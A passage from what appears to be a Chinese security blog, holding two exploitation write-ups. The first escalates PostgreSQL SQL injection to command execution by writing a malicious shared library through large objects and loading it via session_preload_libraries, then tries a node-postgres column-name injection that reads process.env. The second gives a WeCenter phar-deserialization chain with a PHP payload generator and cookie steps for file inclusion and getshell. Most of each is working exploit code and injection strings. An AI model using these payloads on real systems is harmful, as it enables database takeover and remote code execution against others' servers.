<p>Other libraries can also be preloaded. By preloading a shared library, the library startup time is avoided when the library is first used. However, the time to start each new server process might increase slightly, even if that process never uses the library. So this parameter is recommended only for libraries that will be used in most sessions. Also, changing this parameter requires a server restart, so this is not the right setting to use for short-term debugging tasks, say. Use session_preload_libraries for that instead.</p>
</blockquote>
<p>local_preload_libraries只允许加载指定目录的库，session_preload_libraries只允许superuser修改但是可以加载任意目录的库，感觉这个方便点。session_preload_libraries配置从pg10开始存在，低于pg10时，可以使用local_preload_libraries，不过该配置只允许加载$libdir/plugins/目录下的库，需要将库写入到该目录下。<br>当每次有新连接进来时，都会加载session_preload_libraries配置的共享库。<br>这里通过注入将so写入到tmp目录，再修改配置，再reloadconf即可实现利用。<br>首先编译出一个共享库，一开始想实现直接回显，折腾了下失败了，在共享库中定义好回显函数后，应该需要在数据库中create xxxx才能够实现利用，需要多行，这里暂时是直接在so的构造方法中实现命令执行。<br>为了防止用户create function直接调用系统库，如libc的system等，pgsql高版本中，加载外部动态库时会检查magic block,如果不存在则加载失败，如果session_preload_libraries配置的so有问题，数据库就会挂掉。</p>
<p>共享库大概代码如下，</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;postgres.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;fmgr.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> PG_MODULE_MAGIC</span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">preload</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;touch /tmp/test&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时在magic block中，会验证版本是否一致，如果用pg11编译出的so 是不能在pg其他版本中加载的。<br>首先看看 PG_MODULE_MAGIC的宏定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The actual data block contents */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_MODULE_MAGIC_DATA \</span></span><br><span class="line">&#123; \</span><br><span class="line">        <span class="keyword">sizeof</span>(Pg_magic_struct), \</span><br><span class="line">        PG_VERSION_NUM / <span class="number">100</span>, \</span><br><span class="line">        FUNC_MAX_ARGS, \</span><br><span class="line">        INDEX_MAX_KEYS, \</span><br><span class="line">        NAMEDATALEN, \</span><br><span class="line">        FLOAT4PASSBYVAL, \</span><br><span class="line">        FLOAT8PASSBYVAL \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其中很明显有个PG_VERSION_NUM，加载so的版本验证就是通过PG_VERSION_NUM,同时因为除了100所以PG_VERSION_NUM最后两位不重要，PG_VERSION_NUM在pg_config.h中定义,</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* PostgreSQL version as a string */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_VERSION <span class="meta-string">&quot;12.4&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* PostgreSQL version as a number */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PG_VERSION_NUM 120004</span></span><br></pre></td></tr></table></figure>

<p>PG_VERSION_NUM的生成方法也比较简单 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PG_VERSION_NUM      &#x3D;&gt; sprintf(&quot;%d%04d&quot;, $majorver, $minorver),</span><br></pre></td></tr></table></figure>

<p>12.4 对应 PG_VERSION_NUM 为 120004<br>9.4.11 对应 PG_VERSION_NUM 为 90411<br>所以每次编译so时，需要根据目标版本修改一下pg_config.h的PG_VERSION_NUM，通过version()获取到目标的版本是 10.1 那么对应的就为 100001</p>
<p>编译so 然后base64写入目标机器，一顿操作，结果悲剧了 返回 HTTP/1.1 414 Request-URI Too Large, so共享库太大，导致URL超长了，尝试将GET换成POST，发现该注入点并没有接收POST参数，那么还是只有从GET入手，首先想到的肯定就是分段写入。</p>
<p>➜  /tmp cat b.so | base64 | wc -c<br>   21709<br>末尾多了一个换行，实际长度21708，基本分三次就能搞定，这里分段写入可以使用lo_put。</p>
<p>创建一个空lo,<br><code>sorter=(select/**/lo_create(15))</code><br>截前7000字符,同时因为base64中含有”+”,所以需要url编码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; urllib.quote(a[:7000])</span><br><span class="line">&#39;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAY省略</span><br></pre></td></tr></table></figure>
<p>然后put到lo中，lo_put时必须要在后面拼接一个字符，因为lo_put是一个void方法，order by void会报错，<br><code>sorter=(select/**/lo_put(15,0,$$前7000字符$$)||$$x$$):B</code><br>继续截取7000-14000字符，然后lo_put<br><code>sorter=(select/**/lo_put(15,7000,$$7000-14000$$)||$$x$$):B</code></p>
<p>写完所有字符后，校验一下写入的内容是否有问题<br><code>sorter=cast(encode(lo_get(15),$$escape$$)as/**/integer):b</code></p>
<p>再将内容base64解码后载入到largeobject中<br><code>sorter=(select/**/lo_from_bytea(40,decode(encode(lo_get(15),$$escape$$),$$base64$$))):b</code></p>
<p>再使用lo_export将so写入到目标机器中<br><code>sorter=lo_export(40,$$/tmp/a.so$$)</code></p>
<p>然后又是老一套，修改目标的配置文件，在目标原始的配置文件最后加入<br>session_preload_libraries = ‘/tmp/a.so’</p>
<p>再去覆盖掉原始配置文件，在覆盖掉原配置文件后，执行sorter=(select/**/pg_reload_conf())就自动加载了so实现了命令执行。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/2020/11/16/16036981766016.jpg"></p>
<p>拿下数据库服务器后，发现数据库配置了pg_hba，不需要密码即可登录。尝试去打web服务器，node-postgres老版本存在代码执行洞，如果能够控制SQL返回的列名即可实现代码执行，这里因为控制了数据库服务器如果给一个表添加一个类似”\‘+console.log(process.env)]=null;//“字段  alter table xxxxx add “&#39;+console.log(process.env)]=null;//“ varchar(20);  ,如果web有对该表使用select *操作，即可实现rce.<br>不过最后没成功，应该还是目标node-postgres版本比较高:(</p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a target="_blank" rel="noopener" href="https://pulsesecurity.co.nz/articles/postgres-sqli">https://pulsesecurity.co.nz/articles/postgres-sqli</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html">https://www.leavesongs.com/PENETRATION/node-postgres-code-execution-vulnerability.html</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    

    

    </div>

    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2020/01/22/WECENTER-反序列任意文件包含利用链/"><span>WECENTER 反序列任意文件包含利用链</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2020/01/22/WECENTER-反序列任意文件包含利用链/" rel="bookmark">
        <time class="entry-date published" datetime="2020-01-22T07:21:31.000Z">
          2020-01-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>看了下最近的WeCenter的反序列，原文最后是通过反序列执行任意SQL语句进入后台实现GETSHELL。自己想另外找一个前台就能GETSHELL的利用链，就去看了下代码。</p>
<h2 id="POP"><a href="#POP" class="headerlink" title="POP"></a>POP</h2><p>system/Savant3.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Savant3</span> </span>&#123;</span><br><span class="line">    .......</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;getOutput();</span><br><span class="line">	&#125;</span><br><span class="line">	.......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在toString魔术方法中调用了getOutput方法，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getOutput</span>(<span class="params">$tpl = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $output = <span class="keyword">$this</span>-&gt;fetch($tpl);</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isError($output)) &#123;</span><br><span class="line">           $text = <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;error_text&#x27;</span>];</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;escape($text);</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="keyword">return</span> $output;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>接着调用fetch方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params">$tpl = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="comment">// make sure we have a template source to work with</span></span><br><span class="line">		<span class="keyword">if</span> (is_null($tpl)) &#123;</span><br><span class="line">			$tpl = <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;template&#x27;</span>];</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// get a path to the compiled template script</span></span><br><span class="line">		$result = <span class="keyword">$this</span>-&gt;template($tpl);</span><br><span class="line"></span><br><span class="line">		<span class="comment">// did we get a path?</span></span><br><span class="line">		<span class="keyword">if</span> (! $result || <span class="keyword">$this</span>-&gt;isError($result)) &#123;</span><br><span class="line">		</span><br><span class="line">			<span class="comment">// no. return the error result.</span></span><br><span class="line">			<span class="keyword">return</span> $result;</span><br><span class="line">			</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		</span><br><span class="line">			<span class="comment">// yes.  execute the template script.  move the script-path</span></span><br><span class="line">			<span class="comment">// out of the local scope, then clean up the local scope to</span></span><br><span class="line">			<span class="comment">// avoid variable name conflicts.</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;fetch&#x27;</span>] = $result;</span><br><span class="line">			<span class="keyword">unset</span>($result);</span><br><span class="line">			<span class="keyword">unset</span>($tpl);</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// are we doing extraction?</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;extract&#x27;</span>]) &#123;</span><br><span class="line">				<span class="comment">// pull variables into the local scope.</span></span><br><span class="line">				extract(get_object_vars(<span class="keyword">$this</span>), EXTR_REFS);</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// buffer output so we can return it instead of displaying.</span></span><br><span class="line">			ob_start();</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// are we using filters?</span></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;filters&#x27;</span>]) &#123;</span><br><span class="line">				<span class="comment">// use a second buffer to apply filters. we used to set</span></span><br><span class="line">				<span class="comment">// the ob_start() filter callback, but that would</span></span><br><span class="line">				<span class="comment">// silence errors in the filters. Hendy Irawan provided</span></span><br><span class="line">				<span class="comment">// the next three lines as a &quot;verbose&quot; fix.</span></span><br><span class="line">				ob_start();</span><br><span class="line">				<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;fetch&#x27;</span>];</span><br><span class="line">				<span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;applyFilters(ob_get_clean());</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="comment">// no filters being used.</span></span><br><span class="line">				<span class="keyword">include</span> <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;fetch&#x27;</span>];</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			<span class="comment">// reset the fetch script value, get the buffer, and return.</span></span><br><span class="line">			<span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;fetch&#x27;</span>] = <span class="literal">null</span>;</span><br><span class="line">			<span class="keyword">return</span> ob_get_clean();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在getOutput调用fetch方法时，传入的参数为null。所以这时候可以通过控制__config[‘template’]成员变量进而控制tpl模板路径。接着会调用template方法获取模板文件绝对路径，如果文件存在就会包含该文件。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">template</span>(<span class="params">$tpl = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// set to default template if none specified.</span></span><br><span class="line">	<span class="keyword">if</span> (is_null($tpl)) &#123;</span><br><span class="line">		$tpl = <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;template&#x27;</span>];</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// find the template source.</span></span><br><span class="line">	$file = <span class="keyword">$this</span>-&gt;findFile(<span class="string">&#x27;template&#x27;</span>, $tpl);</span><br><span class="line">	<span class="keyword">if</span> (! $file) &#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">$this</span>-&gt;error(</span><br><span class="line">			<span class="string">&#x27;ERR_TEMPLATE&#x27;</span>,</span><br><span class="line">			<span class="keyword">array</span>(<span class="string">&#x27;template&#x27;</span> =&gt; $tpl)</span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>在template方法中，通过findFile方法获取模板文件的绝对路径，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">findFile</span>(<span class="params">$type, $file</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// get the set of paths</span></span><br><span class="line">	$set = <span class="keyword">$this</span>-&gt;__config[$type . <span class="string">&#x27;_path&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">// start looping through the path set</span></span><br><span class="line">	<span class="keyword">foreach</span> ($set <span class="keyword">as</span> $path) &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// get the path to the file</span></span><br><span class="line">		$fullname = $path . $file;</span><br><span class="line"></span><br><span class="line">		<span class="comment">// is the path based on a stream?</span></span><br><span class="line">		<span class="keyword">if</span> (strpos($path, <span class="string">&#x27;://&#x27;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">			<span class="comment">// not a stream, so do a realpath() to avoid</span></span><br><span class="line">			<span class="comment">// directory traversal attempts on the local file</span></span><br><span class="line">			<span class="comment">// system. Suggested by Ian Eure, initially</span></span><br><span class="line">			<span class="comment">// rejected, but then adopted when the secure</span></span><br><span class="line">			<span class="comment">// compiler was added.</span></span><br><span class="line">			$path = realpath($path); <span class="comment">// needed for substr() later</span></span><br><span class="line"></span><br><span class="line">			$fullname = realpath($fullname);</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		<span class="comment">// the substr() check added by Ian Eure to make sure</span></span><br><span class="line">		<span class="comment">// that the realpath() results in a directory registered</span></span><br><span class="line">		<span class="comment">// with Savant so that non-registered directores are not</span></span><br><span class="line">		<span class="comment">// accessible via directory traversal attempts.</span></span><br><span class="line">		<span class="keyword">if</span> (file_exists($fullname) &amp;&amp; is_readable($fullname) &amp;&amp;</span><br><span class="line">			substr($fullname, <span class="number">0</span>, strlen($path)) == $path) &#123;</span><br><span class="line">			<span class="keyword">return</span> $fullname;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// could not find the file in the set of paths</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">false</span>;</span><br></pre></td></tr></table></figure>

<p>可见模板的目录来自__config[$type . ‘_path’]成员变量，模板文件名来自tpl变量，都可以通过反序列控制这些变量。如果文件存在就会直接返回该文件路径然后包含该文件，所以在反序列时，可以实现任意文件包含。</p>
<p>接着需要找一个能触发Savant3类__toString方法的链。<br>在system/Zend/Mail/Protocol/Imap.php中，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Zend_Mail_Protocol_Imap</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ........</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;logout();</span><br><span class="line">    &#125;</span><br><span class="line">    ........</span><br><span class="line">&#125;    </span><br></pre></td></tr></table></figure>
<p>跟入logout方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">logout</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $result = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;_socket) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            $result = <span class="keyword">$this</span>-&gt;requestAndResponse(<span class="string">&#x27;LOGOUT&#x27;</span>, <span class="keyword">array</span>(), <span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Zend_Mail_Protocol_Exception $e) &#123;</span><br><span class="line">            <span class="comment">// ignoring exception</span></span><br><span class="line">        &#125;</span><br><span class="line">        fclose(<span class="keyword">$this</span>-&gt;_socket);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_socket = <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在设置了_socket成员变量的情况下会接着调用requestAndResponse方法，</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">requestAndResponse</span>(<span class="params">$command, $tokens = <span class="keyword">array</span>(<span class="params"></span>), $dontParse = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;sendRequest($command, $tokens, $tag);</span><br><span class="line">    $response = <span class="keyword">$this</span>-&gt;readResponse($tag, $dontParse);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $response;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sendRequest</span>(<span class="params">$command, $tokens = <span class="keyword">array</span>(<span class="params"></span>), &amp;$tag = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!$tag) &#123;</span><br><span class="line">        ++<span class="keyword">$this</span>-&gt;_tagCount;</span><br><span class="line">        $tag = <span class="string">&#x27;TAG&#x27;</span> . <span class="keyword">$this</span>-&gt;_tagCount;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $line = $tag . <span class="string">&#x27; &#x27;</span> . $command;</span><br></pre></td></tr></table></figure>

<p>在sendRequest方法中，++操作符对对象类型无影响，_tagCount属性和’TAG’字符串进行了拼接，将_tagCount属性设置为Savant3的实例对象就能触发Savant3的toString魔术方法进而实现利用。</p>
<p>反序列触发点就不再写了，直接看之前的文章即可。</p>
<h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>/?/publish/<br>注册完账号后，在发起问答里上传被包含的图片 </p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_1.jpg" alt="-w1393"></p>
<p>uploads/question/20200122/81f8ed3cbc7fe76fc7b18e28108316b9.jpg</p>
<p>然后生成Phar, 访问plugins/wc_editor/editor.php文件可获取到绝对路径，也可以使用相对路径。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_2.jpg" alt="-w932"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Savant3</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> $__config = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;template&#x27;</span>] = <span class="string">&#x27;81f8ed3cbc7fe76fc7b18e28108316b9.jpg&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;__config[<span class="string">&#x27;template_path&#x27;</span>] = <span class="keyword">array</span>(<span class="string">&quot;/Applications/MAMP/htdocs/test/wecenter/uploads/question/20200122/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Zend_Mail_Protocol_Imap</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $_socket;</span><br><span class="line">    <span class="keyword">protected</span> $_tagCount;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_socket = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;_tagCount = <span class="keyword">new</span> Savant3();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = <span class="keyword">new</span> Zend_Mail_Protocol_Imap();</span><br><span class="line"></span><br><span class="line">$filename = <span class="string">&quot;exp.phar&quot;</span>;</span><br><span class="line">$phar=<span class="keyword">new</span> Phar($filename);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setMetadata($obj);</span><br><span class="line">$phar-&gt;addFromString(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>生成后接着上传phar文件。<br><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_3.jpg" alt="-w1427"></p>
<p>得到phar文件地址，<br>uploads/question/20200122/126d8d61e2d864a875dc714380b833a6.jpg</p>
<p>接着访问/?/m/weixin/binding/ 绑定微信，将phar文件地址替换到以下cookie里 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cookie前缀_WXConnect&#x3D;&#123;&quot;access_token&quot;:&#123;&quot;openid&quot;:&quot;aa&quot;&#125;,&quot;access_user&quot;:&#123;&quot;nickname&quot;:&quot;aaa&quot;,&quot;headimgurl&quot;:&quot;phar:&#x2F;&#x2F;.&#x2F;uploads&#x2F;question&#x2F;20200122&#x2F;126d8d61e2d864a875dc714380b833a6.jpg&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_4.jpg" alt="-w1068"></p>
<p>最后访问/?/account/ajax/synch_img/ 即可触发反序列。</p>
<p><img src="https://yulegeyublog.oss-cn-beijing.aliyuncs.com/we_5.jpg" alt="-w518"></p>
<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p>1.<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7077">https://xz.aliyun.com/t/7077</a></p>

      
    </div>

  </div>

  <div class="article-footer">
